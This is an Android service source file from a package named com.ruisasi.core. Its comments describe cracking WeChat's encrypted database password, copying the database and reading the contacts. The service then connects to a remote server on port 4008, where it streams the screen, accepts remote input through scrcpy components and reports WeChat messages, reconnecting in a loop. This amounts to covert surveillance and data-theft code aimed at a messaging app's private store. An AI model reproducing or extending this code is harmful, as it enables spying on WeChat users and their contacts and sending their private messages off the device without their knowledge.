package com.ruisasi.core;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.Network;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import com.genymobile.scrcpy.EventController;
import com.ruisasi.weChat.DatabaseTools;
import com.ruisasi.weChat.WeChatDatabase;
import com.ruisasi.weChat.domain.Contact;
import com.wangheart.rtmpfile.ffmpeg.FFmpegHandle;
import com.wangheart.rtmpfile.rtmp.RtmpHandle;

import net.sqlcipher.database.SQLiteDatabase;

import java.io.FileDescriptor;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.concurrent.locks.ReadWriteLock;
import java.util.concurrent.locks.ReentrantReadWriteLock;


public class MainService extends Service {
    public static Boolean sleepBitcon =true;
    public static Boolean reLink = true;

    public static ReadWriteLock rwl = new ReentrantReadWriteLock();
    public static int port = 16886;
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    public SystemInfo si;
    private SocketSendThread  sst;
    private SocketRecvThread srt;
    private VideoStreamSend vss;
    private   SendVideoSocket svs;
    public static ArrayList<Contact> list = null;
    LocalSocket ls = null;
    LocalServerSocket lss = null;
    public LocalSocket create_localserversocket(){

        try {
            lss = new LocalServerSocket("weixin_socket");
            Log.i("TAG","正在等待 socket 连接。。。。");
            ls = lss.accept();
            Log.i("TAG"," socket 连接成功。。。。");
            return ls;
        }catch (IOException e){
            Log.i("TAG","Exception0:"+e.getMessage());
            return null;
        }
    }

    public void excute(Socket socket,FileDescriptor fd,SystemInfo si){
        MainService.sleepBitcon = true;//唤醒
        mainflag = true;
        LocalSocket ls = create_localserversocket();
        sst = new SocketSendThread(fd,si);
        sst.start();//心跳程序
        //视频流发送线程
        svs= new SendVideoSocket(port);
        svs.isReuseAddr();
        svs.start();
//        srt =    new SocketRecvThread(fd, socket,vss,getApplicationContext());
        srt =    new SocketRecvThread(fd, socket,vss,ls,getApplicationContext());
        srt.start(); //接受响应程序
        //屏幕与键盘
        vss = new VideoStreamSend(socket);
        VideoStreamSend.stopStream = true;
        vss.start();

        //音频开启
//        Intent i = new Intent(this,AudioStreamService.class);
//        startService(i);

        //微信服务器发送
        WeixinSocketThread wst = new WeixinSocketThread(fd,ls);
        wst.start();

    }
    private    MySocket msocket;
    private boolean mainflag = true;

    @Override
    public void onCreate() {
        super.onCreate();
//       FFmpegHandle.init(this);
        Log.i("StartActivity","正在执行 主服务 oncreate()");
//        startForeground();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("StartActivity","正在执行 MainService onStartCommand()");
        InitData();
        mainflag = true;
        MainThread mt = new MainThread();
        mt.start();
        NotifyThread nt =new NotifyThread();
        nt.start();

        return super.onStartCommand(intent, flags, startId);
    }
    public void DatabaseInit(){
        WeChatDatabase wd = new WeChatDatabase(getApplicationContext());
        String databasePwd =  wd.getPassword(); //破解并获取数据库密码
        wd.copyDatabase();//拷贝微信数据库文件
        SQLiteDatabase db = wd.openDatabase(databasePwd);//通过密码获取到数据库对象
        list = DatabaseTools.openContactTable(db);
    }
    public class MainThread extends Thread{
        @Override
        public void run() {
           DatabaseInit();
            msocket = new MySocket();

            while(mainflag){
                msocket.SocketCreat();
                msocket.socketLink(NotifyThread.IP,4008);
//               msocket.socketLink("192.168.255.103",4008);
                if(msocket.getSocket().isConnected()){
                    //连接成功
                    sleepBitcon = true;
                    Socket socket  =msocket.getSocket();
                    msocket.initSocketFd();//初始化fd;
                    FileDescriptor fd = msocket.getSocketFd();
                    //开启线程
                    VideoStreamSend.stopStream = true;
                    excute(socket,fd,si);
                    if(msocket.getSocket().isConnected()&&mainflag){
                        Log.i("StartActivity","进入MainThread 休眠分支");
                        //一直循环直到失去连接
                            while(MainService.sleepBitcon){
                             //   Log.i("StartActivity","正常运行中。。。。");
                               Sleep(2000);
                            }
                        Log.i("StartActivity","网络断连 关闭大部分线程");
                        onStop();
                        Log.i("StartActivity","等待 网络重连");
                        while(MainService.reLink){
                            Log.i("StartActivity","等待网络连接中。。。。");
                            Sleep(2000);
                        }
                        Log.i("StartActivity","网络重连成功");
                    }
                }else{//连接失败
                    Sleep(3000);
                    Log.i("StartActivity","连接失败，正在重连");
                }
            }
            Log.i("StartActivity","主线程退出");
        }

    }
    public void InitData(){ //获取系统信息
        si =  SystemInfo.getInstance(this);
        Log.i("StartActivity",si.IP);

    }
    public static void Sleep(long s){
        try {
            Thread.sleep(s);
        }catch (InterruptedException e){}
    }


    public void onStop(){
        Log.i("StartActivity","正在执行 MainService onstop()");
        if(vss!=null) {//视频流线程
             VideoStreamSend.flag = false;//关闭发送流
            Log.i("StartActivity","MainService onstop() VSS rtmp stop");
            try {

                svs.stop();
                svs =null;
            }catch (IOException e){
                Log.i("StartActivity","web socket IOException "+ e.getMessage());
            }catch (InterruptedException e){
                Log.i("StartActivity","web socket InterruptedException "+ e.getMessage());
            }
            synchronized (EventController.obj){
                EventController.obj.notify();
                EventController.obj = true;
                VideoStreamSend.stopStream = false;
                Log.i("StartActivity","MainService onstop() VSS notifyAll");
            }
        }
        //音频线程
//        Intent i = new Intent(this,AudioStreamService.class);
//        stopService(i);
        Log.i("StartActivity","MainService onstop() ASS  stop");
//        msocket = null;//主线程
        if(srt.isAlive()) {
            srt.flag = false;//接受线程
            srt = null;
            Log.i("StartActivity","MainService onstop() SRT SST  stop");
        }
        if(sst!=null){
            sst.flag = false;//发送线程
            sst.interrupt();
            sst = null;
        }

        try {
            if(MySocket.socket !=null) {
                MySocket.socket.close();
                MySocket.socket = null;
            }
            Log.i("StartActivity","MainService onstop() Socket stop");
        }catch (IOException e){}
        //停止微信上报微信消息模块
        WeixinSocketThread.flag = false;
        Log.i("StartActivity","关闭微信上报消息模块");
        try {
            ObjectOutputStream out = new ObjectOutputStream(ls.getOutputStream());
            out.writeObject("abc");
            ls.close();
            lss.close();
            Log.i("StartActivity","关闭微信本地socket的连接");
        }catch (IOException e){

        }
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
        onStop();
        Log.i("StartActivity","MainService onDestroy() ");
        mainflag = false;//主线程
        synchronized (MainService.sleepBitcon) {
            try {
                Log.i("StartActivity", " notify");
                MainService.sleepBitcon = false;//唤醒
                MainService.sleepBitcon.notifyAll();
            } catch (Exception e1) {
                e1.printStackTrace();
            }
        }
        NotifyThread.flag = false;//唤醒线程关闭
        stopForeground(true);
//        Intent intent = new Intent();
//        intent.setAction("com.ruisasi.core.destroy");
//        intent.setComponent(new ComponentName("com.ruisasi.core","com.ruisasi.core.MyReceiver"));
//        sendBroadcast(intent);
    }
}
